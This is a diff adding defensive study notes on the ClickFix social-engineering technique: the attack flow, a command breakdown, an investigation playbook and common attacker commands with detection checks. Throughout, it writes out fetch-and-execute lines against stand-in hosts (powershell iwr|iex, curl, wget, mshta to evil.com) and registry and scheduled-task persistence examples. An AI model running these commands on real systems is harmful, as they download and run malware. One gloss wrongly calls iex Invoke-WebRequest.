@@ -1,0 +1,210 @@
+Clickfix is a social engineering attack, where the attacker tricks the users into:
+  - Copying a command
+  - Pasting it into Run/Powershell/CMD
+  - Executing it Manually
+
+Attack Flow:
+
+Phishing Email / Web Page
+        ↓
+Fake Error Message ("Fix required")
+        ↓
+Copy Command Button
+        ↓
+User opens Run / PowerShell
+        ↓
+Paste & Execute
+        ↓
+Payload Download
+        ↓
+Loader Execution
+        ↓
+Persistence
+        ↓
+C2 Communication
+        ↓
+Credential Theft / Lateral Movement
+
+Command Breakdown:
+  powershell -w hidden -c "iwr hxxp://evil.site/a.ps1 | iex"
+
+| Part         | Meaning                           |             |
+| ------------ | --------------------------------- | ----------- |
+| `powershell` | Launch PowerShell                 |             |
+| `-w hidden`  | Hidden window (stealth)           |             |
+| `-c`         | Execute command                   |             |
+| `iwr`        | Download file (Invoke-WebRequest) |             |
+| `            | `                                 | Pipe output |
+| `iex`        | Execute downloaded content        |             |
+
+So:
+  Download + Execute in Memory (Fileless attack)
+
+Commands to learn:
+
+Powershell download commands:
+iwr ==>   Invoke-webrequest
+Curl ==> Is a tool for transferring data from or to a server using URL's
+Wget ==> is a cmd tool, that can download files using HTTP,HTTPS,FTP & FTPS
+
+Execution Commands:
+iex ==> Invoke-Expression  ==> It takes a string & executes it as if it were a powersehll command.
+Start-Process ==> use to start the process
+
+Encoding (Obfuscation)
+-enc
+FromBase64String
+
+Common Malware Delivered:
+- Lumma Stealer
+- RedLine Stealer
+- Vidar
+
+Detection Points:
+  - Powershell launched from browser
+  - Command line Suspicious
+  - Encoded Payload
+================================================
+Investigation Playbook:
+Initial Access:
+  - Email?
+  - Web?
+  - User manually ran command
+
+Check Commandline
+powershell -w hidden -enc ...
+Red Flags:
+- hidden
+- encoded
+- iex
+- download
+
+Decode Base64
+powershell -enc SQBFAFgA
+Decode to see real payload
+
+Check Network:
+  Look for 
+    - Sucupisicous domain
+    - IP
+    - Newly registered domains
+Check Persistence
+Check Payload:
+  Downloaded Exe, DLL, script?
+
+ powershell -w hidden -enc JABXAGMAPQBuAGU...
+
+Decoded:
+
+$wc=new-object net.webclient
+$wc.downloadstring('http://evil.site/a.ps1') | iex
+
+Meaning:
+➡️ Download script
+➡️ Execute in memory
+
+No file saved → stealth
+=================================
+
+
+Most Important commands to Memorize:
+powershell -  Windows Powerful scripting shell
+Why Attackers use it:
+  Attackers use to download Malware
+  Runs scripts in Memory (Fileless Attack)
+  Bypass AV
+
+cmd - Basic Windows command prompt
+Why Attackers use it:
+  LAunch other tools
+  Chain commands
+  Execute payloads
+
+iwr - Invoke-WebRequest (Powershell command to download from Internet)
+Why Attackers use it:
+  Download Payload silently
+  Eg: iwr http://malicious.com/payload.exe
+Checks:
+  External URL
+  Suspicious domain
+  Download location
+
+curl - is a tool to transfer data from URL
+Why Attackers use it:
+  Download Malware
+  Eg: curl http://evil.com/file.exe -o file.exe
+Check:
+External IP
+Newly registered domain
+Suspicious file type
+
+wget - Another download tool (similar to curl) - download from internet
+Why Attackers Use it:
+Eg: wget http://attacker.com/backdoor.exe
+Pull payload from server
+
+iex - Invoke-WebRequest - Executes command as code.
+Run downloaded script directly in memory (fileless attack)
+iex (iwr http://evil.com/script.ps1)
+Check:
+Very suspicious combination:
+  iwr + iex
+  download + execute
+
+Start-Process - Launch another program
+  Run Payload quietly
+  Eg: Start-Process malware.exe
+
+reg add - Adds registry key. [ Persistence-Run Malware at startup ]
+  Eg: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+schtasks - create scheduled task.
+        Run Malware every hr / on reboot
+    Eg: schtasks /create /sc minute /mo 30
+
+mshta - Runs HTA (HTML APplication)
+    Executes Remote script
+    Eg: mshta http://evil.com/payload.hta
+
+rundll32 - Runs DLL File.
+  Executes Malicious DLL Files.
+  Eg: rundll32 malware.dll,EntryPoint
+Check:
+  DLL path
+  User temp folder
+  Downloads folder
+
+Dangerous Combo:
+powershell + iwr + iex
+cmd + powershell
+mshta + URL
+rundll32 + temp folder DLL
+schtasks + persistence
+reg add + run key
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
